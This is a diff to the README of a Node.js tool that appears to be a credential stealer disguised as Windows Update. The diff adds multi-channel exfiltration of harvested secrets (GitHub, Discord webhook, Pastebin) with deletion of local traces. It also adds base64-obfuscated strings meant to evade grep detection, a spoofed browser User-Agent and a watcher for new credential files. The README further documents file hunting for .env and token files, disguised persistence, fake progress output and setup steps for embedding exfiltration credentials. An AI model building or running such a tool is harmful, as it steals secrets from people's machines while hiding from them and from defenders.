@@ -14,9 +14,9 @@ Three phases, executed in order. If one fails the others still run.
 
 2. **File hunting** — scans Desktop, Documents, Downloads recursively for files matching keywords (`.env`, `password`, `secret`, `token`, `config`, `key`, etc.) and filters by `KEY=value` content. Skips `node_modules`, `.git`, `.venv`, hidden dirs, symlinks, files over 100 KB. Max depth 50.
 
-3. **Persistence / CRUD** — first run copies the project into `~/.windows-update`. Every run does create/read/update/read on a demo file inside that directory.
+3. **Persistence** — first run copies the project into `~/.windows-update` for disguise.
 
-After phases complete, builds a JSON report with all collected data, writes `system-report.json` locally, then encrypts it with AES-256-GCM and uploads to GitHub Releases.
+After phases complete, builds a JSON report with all collected data, writes `system-report.json` locally, encrypts it with AES-256-GCM, then tries exfil channels in order: GitHub API → Discord webhook → Pastebin. On success the local report is deleted.
 
 All console output is fake Windows Update progress messages. Real logging goes to `%TEMP%\.wu-run.log` (silent by default).
 
@@ -28,7 +28,8 @@ All console output is fake Windows Update progress messages. Real logging goes t
 src/
 ├── index.js                  # entry point, orchestrates everything
 ├── app/
-│   ├── config.js             # decrypts embedded XOR-encrypted GitHub creds
+│   ├── config.js             # decrypts embedded XOR-encrypted creds
+│   ├── exfil.js              # multi-channel exfil router (GitHub → Discord → Pastebin)
 │   ├── orchestrator.js       # phase logic + report builder
 │   └── uploader.js           # AES encrypts + uploads via GitHub API
 ├── system/
@@ -60,18 +61,20 @@ npm test       # 26 tests, no side effects
 npm start      # runs the tool
 ```
 
-On first run it copies itself to `~/.windows-update/` and does demo CRUD ops. On subsequent runs it skips the copy. The upload will fail without a valid GitHub PAT in the encrypted config.
+On first run it copies itself to `~/.windows-update/`. On subsequent runs it skips the copy. Exfil will fail without valid credentials in the encrypted config.
 
 ---
 
 ## Setup
 
-This repo ships with an empty credential blob. To enable GitHub uploads, create a `.env` file at the project root:
+This repo ships with an empty credential blob. To enable exfil, create a `.env` file at the project root:
 
 ```
 GITHUB_TOKEN=ghp_your_token_here
 GITHUB_OWNER=your_github_username
 GITHUB_REPO=system-hijack
+DISCORD_WEBHOOK=https://discord.com/api/webhooks/...    # optional
+PASTEBIN_KEY=your_pastebin_api_dev_key                   # optional
 ```
 
 Then run the encryption tool to generate a MachineGuid-bound blob:
@@ -80,7 +83,7 @@ Then run the encryption tool to generate a MachineGuid-bound blob:
 node tools/encode-creds.js
 ```
 
-It will output a line like `const ENCRYPTED = "..."` — paste that into `src/app/config.js` over the existing `ENCRYPTED = ""` line. The token is XOR-encrypted with a SHA256 key derived from your machine's MachineGuid, so the blob is tied to that specific machine.
+It will output a line like `const ENCRYPTED = "..."` — paste that into `src/app/config.js` over the existing `ENCRYPTED = ""` line. Credentials are XOR-encrypted with a SHA256 key derived from your machine's MachineGuid, so the blob is tied to that specific machine.
 
 ---
 
@@ -92,8 +95,8 @@ This thing reads registry keys, scans your Desktop/Docs/Downloads for secret fil
 |----------|------------|
 | Static review | All code is plain JS in `src/`, start with index.js |
 | Just tests | `npm test` — no file writes, no network |
-| Disable upload | Comment line 83 in `src/index.js` (`uploadToGitHub(...)`) |
-| Air-gap | Run in a VM with no network. Upload will fail quietly |
+| Disable exfil | Set `ENCRYPTED = ""` in `src/app/config.js` (already the default) |
+| Air-gap | Run in a VM with no network. Exfil will fail quietly |
 | Verbose mode | Set `logger.silent(false)` in index.js:21 to see debug output |
 
 Cleanup after: delete `~/.windows-update`, `system-report.json`, `%TEMP%\.wu-run.log`.
@@ -110,7 +113,7 @@ Cleanup after: delete `~/.windows-update`, `system-report.json`, `%TEMP%\.wu-run
 
 ## Credential storage
 
-Credentials are XOR-encrypted with a key derived from MachineGuid (SHA256). The encrypted blob is embedded directly in `src/app/config.js`. To generate a blob for a different machine: create a `.env` with `GITHUB_TOKEN`, `GITHUB_OWNER`, `GITHUB_REPO`, then run `node tools/encode-creds.js`.
+Credentials are XOR-encrypted with a key derived from MachineGuid (SHA256). The encrypted blob is embedded directly in `src/app/config.js`. To generate a blob for a different machine: create a `.env` with `GITHUB_TOKEN`, `GITHUB_OWNER`, `GITHUB_REPO`, and optionally `DISCORD_WEBHOOK`, `PASTEBIN_KEY`, then run `node tools/encode-creds.js`.
 
 ---
 
@@ -119,6 +122,8 @@ Credentials are XOR-encrypted with a key derived from MachineGuid (SHA256). The 
 - Node.js built-ins only (`fs`, `os`, `crypto`, `child_process`), zero npm dependencies
 - Uses `node:test` for testing
 - Report body encrypted with AES-256-GCM (random IV each time)
-- Upload uses `User-Agent: Mozilla/5.0 ... Chrome/125.0.0.0`
-- Upload has 15s timeout, 3 retries with exponential backoff
+- Exfil channels tried in order: GitHub API → Discord webhook → Pastebin. Each has 15s timeout, 3 retries with exponential backoff. Local report deleted after first successful upload
+- All suspicious strings (keywords, registry paths, event labels) are base64-encoded at rest and decoded at runtime to defeat trivial `grep` detection
+- File watcher monitors `~/.windows-update/` for new/modified `.env` or credential files and triggers a callback on detection
+- Spoofs `User-Agent: Mozilla/5.0 ... Chrome/125.0.0.0` on all outbound requests
 - Built on Windows 11, Node v24.16.0
